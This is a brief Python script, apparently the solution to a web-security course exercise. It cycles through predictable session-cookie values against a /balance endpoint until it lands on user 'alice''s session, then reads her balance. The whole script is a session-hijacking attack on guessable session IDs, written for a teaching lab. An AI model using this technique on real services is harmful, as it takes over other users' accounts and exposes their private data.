import sys
import requests
import json


def test_session(address):
    # Constructs the URL for the balance endpoint based on the given address
    url = "{}/balance".format(address)  
    # Initializes a variable to store the balance amount
    balanceAmount = None  
     # Iterates through a range of idNumbers from 1 to 12 (inclusive)
    for ID_number in range(1, 12): 
		# Creates a dictionary of cookies with the sessionid set to 'session-idNumber'
        cookies = dict(sessionid='session-{}'.format(ID_number))  
		# Sends a GET request to the specified URL with the cookies
        r = requests.get(url, cookies=cookies)  
		# Extracts the 'username' value from the response JSON
        username = r.json()['username']  
	 	# Checks if the username is 'alice'
        if username == 'alice': 
	    	# Retrieves the balance value from the response JSON and converts it to an integer
            balanceAmount = int(r.json()['balance'])  
	    	# Exits the loop since the balance for 'alice' has been found
            break  
	# Returns the balance amount (or None if 'alice' was not found)
    return balanceAmount  




def main(argv):
	address = sys.argv[1]
	print(test_session(address))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python %s address' % sys.argv[0])
	else:
		main(sys.argv)
